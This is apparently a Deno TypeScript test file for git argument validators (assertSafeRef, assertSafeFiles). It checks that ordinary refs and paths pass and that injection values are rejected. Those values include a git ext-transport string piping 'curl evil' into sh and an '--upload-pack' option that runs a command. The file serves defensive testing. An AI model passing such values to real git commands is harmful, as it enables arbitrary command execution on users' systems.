import { assertEquals, assertThrows } from "@std/assert";
import { assertSafeFiles, assertSafeRef } from "./git.ts";

Deno.test("assertSafeRef accepts ordinary refs and rejects option-like or helper-transport values", () => {
  for (
    const ok of [
      "origin",
      "main",
      "feature/x-1",
      "v1.2.3",
      "upstream",
      "release_2",
    ]
  ) {
    assertEquals(assertSafeRef(ok, "ref"), ok);
  }
  for (
    const bad of [
      "ext::sh -c 'curl evil|sh'",
      "--upload-pack=touch /tmp/pwn",
      "-v",
      "a..b",
      "with space",
      "trailing/",
      "x.lock",
      "",
      42,
      undefined,
    ]
  ) {
    assertThrows(() => assertSafeRef(bad, "ref"), Error, "invalid ref");
  }
});

Deno.test("assertSafeFiles rejects empty lists and option-like entries", () => {
  assertEquals(assertSafeFiles(["a.ts", "dir/b.ts"]), ["a.ts", "dir/b.ts"]);
  assertThrows(() => assertSafeFiles([]), Error, "non-empty");
  assertThrows(() => assertSafeFiles(["--all"]), Error, "invalid file path");
  assertThrows(() => assertSafeFiles([""]), Error, "invalid file path");
  assertThrows(() => assertSafeFiles("a.ts"), Error, "non-empty");
});
